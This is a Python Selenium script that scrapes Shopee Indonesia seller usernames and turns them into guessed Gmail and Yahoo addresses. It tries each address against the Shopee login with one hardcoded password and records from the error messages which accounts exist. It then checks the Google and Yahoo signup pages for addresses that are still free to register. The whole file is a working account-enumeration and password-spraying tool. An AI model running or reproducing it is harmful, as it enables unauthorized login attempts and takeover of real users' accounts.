from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
import time
from time import sleep
from parsel import Selector

def timestamp(next_page, i, length):
    WINDOW_SIZE = "1920,1080"
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--window-size=%s" % WINDOW_SIZE)
    chrome_options.add_argument('--log-level=3')
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    
    driver = webdriver.Chrome(chrome_options=chrome_options)
    driver.get(next_page)
    driver.implicitly_wait(30)
    
    try:
        for element in range(1,50):
            link = driver.find_element_by_xpath('//*[@class ="col-xs-2-4 shopee-search-item-result__item"]'+str([element])+'/a')
            driver.execute_script("return arguments[0].scrollIntoView();", link)
        sel = Selector(text=driver.page_source)
        label_supplier = sel.xpath('//*[@class ="col-xs-2-4 shopee-search-item-result__item"]/a/@href').extract()
        print('Get URL'+ str(label_supplier))
        
        for ( page, label ) in zip ( range(1, len(label_supplier)), label_supplier):
            url_label = label.replace("'", "")
            driver.get("https://shopee.co.id"+ url_label)
            print("[ INFO ]__main__: Page "+ str(i) + "/" + str(length) )
            print("[ INFO ]__main__: In Progress "+ str(page) + "/" + str(len(label_supplier)) )
            print("[ INFO ]__main__: https://shopee.co.id" + url_label)
            driver.implicitly_wait(30)
            driver.find_element_by_xpath('//*[@class="_3KP9-e"]')
            try:
                driver.implicitly_wait(3)
                driver.find_element_by_xpath('//*[@class="JcbldB _1-SFvy _38WUgo xj7USg _2mDSAK items-center"]')
                sel = Selector(text=driver.page_source)
                status = sel.xpath('//*[@class="JcbldB _1-SFvy _38WUgo xj7USg _2mDSAK items-center"]/text()').extract_first()
                username = sel.xpath('//*[@class="_3KP9-e"]/text()').extract_first()
                print("[ INFO ]__main__: Get Username : " + username + "\n[ ROLES ]__main__: Status : " + status)
                writers = open('user supplier.txt', 'a+', encoding="utf-8")
                writers.writelines(f"{username}|{status}\n")
                writers.close()
            except:
                sel = Selector(text=driver.page_source)
                username = sel.xpath('//*[@class="_3KP9-e"]/text()').extract_first()
                print("[ INFO ]__main__: Get Username : " + username)
                writers = open('user fake.txt', 'a+', encoding="utf-8")
                writers.writelines(f"{username}\n")
                writers.close()
    except:
        print('[ ALERT ]__main__:error connection!')
        timestamp(next_page, i, length)
        
            
    driver.quit()

#main() getUserShopee
def readjoin():
    filter = input('Input Search Keywoard : ')
    localtime = time.asctime(time.localtime(time.time())).split()
    mounth = localtime[1]
    date = localtime[2]
    year = localtime[4]
    clock = localtime[3]
    writers = open('category.txt', 'a+', encoding="utf-8")
    writers.writelines(f"{filter}|{mounth}-{date}-{year} {clock}\n")
    keywoard = filter.replace(' ', '%20')
    URL = 'https://shopee.co.id/search?keyword=' + keywoard
    length = 50
    for i in range(1, length):
        next_page = URL + '&page=' + str(i)
        timestamp(next_page, i, length)
        
def status(user, i, length):
    WINDOW_SIZE = "1920,1080"
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--window-size=%s" % WINDOW_SIZE)
    chrome_options.add_argument('--log-level=3')
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    
    driver = webdriver.Chrome(chrome_options=chrome_options)
    driver.get('https://mall.shopee.co.id/buyer/login')
    driver.implicitly_wait(30)
    try:    
        username = driver.find_element_by_name('loginKey')
        username.send_keys(user + "@gmail.com")
        driver.implicitly_wait(30)
        
        password = driver.find_element_by_name('password')
        password.send_keys('Semogaberkah')
        driver.implicitly_wait(30)
    except:
        print('[ ERROR ]__main__: Alert!, Error Connection!!')
        driver.quit()
        return status(user, i, length)
        
    password.send_keys(Keys.RETURN)
    
    try:
        driver.implicitly_wait(10)
        driver.find_elements_by_xpath('//*[@class="_2d8JQY"]')
    
        print('[ INFO ]__main__: In Progress ' + str(i) + '/' + str(length))
        sel = Selector(text=driver.page_source)
        label_supplier = sel.xpath('//*[@class="_2d8JQY"]/text()').extract_first()
    except:
        print('Logged In Shopee!!')
        driver.quit()
        return False
        
    if (label_supplier == 'Akun Anda belum terdaftar. Apakah Anda ingin daftar sekarang?'):
        not_null = label_supplier.replace('Akun Anda belum terdaftar. Apakah Anda ingin daftar sekarang?', 'NOT NULL')
        print('[ INFO ]__main__: ' + user + "@gmail.com\t => \t" + not_null)
        writers = open('status/not_null.txt', 'a+', encoding="utf-8")
        writers.writelines(f"{user}@gmail.com|{not_null}\n")
        writers.close()
        writers = open('status/results.txt', 'a+', encoding="utf-8")
        writers.writelines(f"{user}@gmail.com|{not_null}\n")
        writers.close()
    elif (label_supplier == 'Akun dan/atau password Anda salah, silakan coba lagi'):
        null = label_supplier.replace('Akun dan/atau password Anda salah, silakan coba lagi', 'NULL')
        print('[ INFO ]__main__: ' + user + "@gmail.com\t => \t" + null)
        writers = open('status/gmail.txt', 'a+', encoding="utf-8")
        writers.writelines(f"{user}@gmail.com|{null}\n")
        writers.close()
        writers = open('status/results.txt', 'a+', encoding="utf-8")
        writers.writelines(f"{user}@gmail.com|{null}\n")
        writers.close()
        
    try:
        driver.implicitly_wait(30)
        driver.get('https://mall.shopee.co.id/buyer/login')
        driver.implicitly_wait(30)
        
        username = driver.find_element_by_name('loginKey')
        username.send_keys(user + "@yahoo.com")
        driver.implicitly_wait(30)
        
        password = driver.find_element_by_name('password')
        password.send_keys('Semogaberkah')
        driver.implicitly_wait(30)
        
        password.send_keys(Keys.RETURN)
        
        try:
            driver.implicitly_wait(30)
            driver.find_elements_by_xpath('//*[@class="_2d8JQY"]')
        except:
            print('Logged In Shopee!!')
            return False
        
        sel = Selector(text=driver.page_source)
        label_supplier = sel.xpath('//*[@class="_2d8JQY"]/text()').extract_first()
        not_null = label_supplier.replace('Akun Anda belum terdaftar. Apakah Anda ingin daftar sekarang?', 'NOT NULL')
        null = label_supplier.replace('Akun dan/atau password Anda salah, silakan coba lagi', 'NULL')
        if (label_supplier == 'Akun Anda belum terdaftar. Apakah Anda ingin daftar sekarang?'):
            print('[ INFO ]__main__: ' + user + "@yahoo.com\t => \t" + not_null)
            writers = open('status/not_null.txt', 'a+', encoding="utf-8")
            writers.writelines(f"{user}@yahoo.com|{not_null}\n")
            writers.close()
            writers = open('status/results.txt', 'a+', encoding="utf-8")
            writers.writelines(f"{user}@yahoo.com|{not_null}\n")
            writers.close()
        elif (label_supplier == 'Akun dan/atau password Anda salah, silakan coba lagi'):
            print('[ INFO ]__main__: ' + user + "@yahoo.com\t => \t" + null)
            writers = open('status/yahoo.txt', 'a+', encoding="utf-8")
            writers.writelines(f"{user}@yahoo.com|{null}\n")
            writers.close()
            writers = open('status/results.txt', 'a+', encoding="utf-8")
            writers.writelines(f"{user}@yahoo.com|{null}\n")
            writers.close()
    except:
        pass
    
    driver.quit()

#main() getStatusUserShopee
def getstatus():
    user = open(r"user.txt", "r")
    reads = user.readlines()
    length = len(reads)
    
    for (read, i) in zip (reads, range(1, length)):
        akun = read.strip()
        user = akun.split("|")[0]
        continued = status(user, i, length)
        if not continued:
            continue
        elif continued:
            return continued
            
def gmail(user, i, length):
    WINDOW_SIZE = "1920,1080"
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--window-size=%s" % WINDOW_SIZE)
    chrome_options.add_argument('--log-level=3')
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    
    driver = webdriver.Chrome(chrome_options=chrome_options)
    driver.get('https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp')
    driver.implicitly_wait(30)
    try:    
        username = driver.find_element_by_name('Username')
        username.send_keys(user)
        driver.implicitly_wait(30)
    except:
        print('[ ERROR ]__main__: Alert!, Error Connection!!')
        driver.quit()
        return gmail(user, i, length)
        
    username.send_keys(Keys.RETURN)
    driver.implicitly_wait(30)
    
    try:
        driver.find_element_by_xpath('//*[@class="o6cuMc"]/div')
        driver.implicitly_wait(5)
        #print('[ INFO ]__main__: In Progress ' + str(i) + '/' + str(length))
        sel = Selector(text=driver.page_source)
        status = sel.xpath('//*[@class="o6cuMc"]/div/text()').extract_first()
        if(status):
            print('[ INFO ]__main__: ' + user + "@gmail.com\t => \t Not Null")
            writers = open('status/resultsgmail.txt', 'a+', encoding="utf-8")
            writers.writelines(f"{user}@gmail.com|Digunakan\n")
            writers.close()
        else:
            print('[ INFO ]__main__: ' + user + "@gmail.com\t => \t Null")
            writers = open('status/resultsgmail.txt', 'a+', encoding="utf-8")
            writers.writelines(f"{user}@gmail.com|Ready\n")
            writers.close()
    except:
        print('Not Found!!')
        
    driver.quit()

#main() gmailChecker
def gmailChecker():
    user = open(r"status/gmail.txt", "r")
    reads = user.readlines()
    length = len(reads)
    
    for (read, i) in zip (reads, range(1, length)):
        akun = read.strip()
        user = akun.split("|")[0]
        continued = gmail(user, i, length)
        if not continued:
            continue
        elif continued:
            return continued

def yahoo(user, i, length):
    WINDOW_SIZE = "1920,1080"
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--window-size=%s" % WINDOW_SIZE)
    chrome_options.add_argument('--log-level=3')
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    
    driver = webdriver.Chrome()
    driver.get('https://login.yahoo.com/account/create')
    driver.implicitly_wait(30)
    try:    
        username = driver.find_element_by_name('yid')
        username.send_keys(user)
        driver.implicitly_wait(30)
    except:
        print('[ ERROR ]__main__: Alert!, Error Connection!!')
        driver.quit()
        return yahoo(user, i, length)
        
    username.send_keys(Keys.RETURN)
    driver.implicitly_wait(30)
    
    try:
        driver.find_element_by_xpath('//*[@class="oneid-error-message"]')
        driver.implicitly_wait(5)
        #print('[ INFO ]__main__: In Progress ' + str(i) + '/' + str(length))
        sel = Selector(text=driver.page_source)
        status = sel.xpath('//*[@class="oneid-error-message"]/text()').extract_first()
        if(status):
            print('[ INFO ]__main__: ' + user + "@gmail.com\t => \t Not Null")
            writers = open('status/resultsYahoo.txt', 'a+', encoding="utf-8")
            writers.writelines(f"{user}@gmail.com|Digunakan\n")
            writers.close()
        else:
            print('[ INFO ]__main__: ' + user + "@gmail.com\t => \t Null")
            writers = open('status/resultsYahoo.txt', 'a+', encoding="utf-8")
            writers.writelines(f"{user}@gmail.com|Ready\n")
            writers.close()
    except:
        print('Not Found!!')
        
    driver.quit()

#main() yahooChecker
def yahooChecker():
    user = open(r"status/yahoo.txt", "r")
    reads = user.readlines()
    length = len(reads)
    
    for (read, i) in zip (reads, range(1, length)):
        akun = read.strip()
        user = akun.split("|")[0]
        continued = yahoo(user, i, length)
        if not continued:
            continue
        elif continued:
            return continued
            
def main():
    print('Enter Options:\n1. Get User\n2. Get Status User\n3. Gmail Checker!\n4. Yahoo.Checker\n')
    choice = str(input('Input Choice : '))
    if (choice == '1'):
        if __name__ == '__main__':
            readjoin()
    elif (choice == '2'):
        if __name__ == '__main__':
            getstatus()
    elif (choice == '3'):
        if __name__ == '__main__':
            gmailChecker()
    elif (choice == '4'):
        if __name__ == '__main__':
            yahooChecker()
    else:
        print('Tidak Ada Opsi!!')
        main()

main()